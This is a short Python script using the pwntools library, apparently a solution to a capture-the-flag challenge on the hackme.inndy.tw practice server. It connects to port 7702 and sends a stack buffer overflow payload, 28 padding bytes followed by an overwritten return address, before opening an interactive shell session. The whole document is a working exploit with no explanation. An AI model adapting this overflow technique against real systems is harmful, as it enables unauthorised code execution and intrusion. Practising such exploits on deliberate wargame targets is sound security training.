from pwn import *

conn = remote('hackme.inndy.tw','7702')

payload = 'a' * 0x1C + p32(0x0804863B)

conn.send(payload)
conn.interactive()
